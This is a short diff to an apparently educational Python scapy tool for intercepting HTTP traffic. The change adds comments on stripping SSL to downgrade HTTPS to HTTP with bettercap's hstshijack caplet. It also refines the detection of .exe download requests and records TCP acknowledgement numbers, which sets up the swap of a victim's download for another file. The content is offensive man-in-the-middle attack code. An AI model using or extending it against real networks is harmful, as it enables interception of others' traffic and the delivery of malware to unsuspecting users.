@@ -5,6 +5,12 @@ import subprocess
 import optparse
 import scapy.all as scapy
 
+# only work with http
+# https --> ssl strip, downgrade to http
+# bettercap -iface eth0 -caplet hstshijack/hstshijack
+# need to use modify_iptables_local
+# dport/sport --> 8080
+
 ack_list = []
 
 def modify_iptables_remote(queue_num):
@@ -34,8 +40,8 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             # if load in http request were to be modified --> TCP handshake needed
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
-                print("[+] Detected exe Request.")
+            if ".exe" in str(scapy_packet[scapy.Raw].load) and b"ip" not in scapy_packet[scapy.Raw].load:
+                print("[+] Detected EXE Request.")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
         elif scapy_packet[scapy.TCP].sport == 80:
